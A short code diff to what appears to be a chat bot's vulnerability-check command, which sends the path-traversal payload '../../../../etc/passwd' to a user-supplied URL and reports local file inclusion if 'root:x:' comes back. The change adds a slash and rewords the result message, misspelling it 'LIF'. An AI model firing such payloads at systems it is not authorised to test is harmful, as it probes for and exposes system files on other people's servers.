@@ -9,11 +9,11 @@ const axios = require('axios');                                                 
       }
 
       const payload = "../../../../etc/passwd"; // Common LFI payload
-      const testUrl = `${url}${encodeURIComponent(payload)}`;
+      const testUrl = `${url}/${encodeURIComponent(payload)}`;
       try {
          const response = await axios.get(testUrl);
          if (response.data.includes("root:x:")) {
-            return sendMessage(senderId, { text: `LFI Vulnerability Detected! Payload: ${testUrl}` }, token);
+            return sendMessage(senderId, { text: `LIF Vulnerability Found.\n\n ‹ ${testUrl} ›` }, token);
          } else {
             return sendMessage(senderId, { text: "No LFI vulnerability detected." }, token);
          }
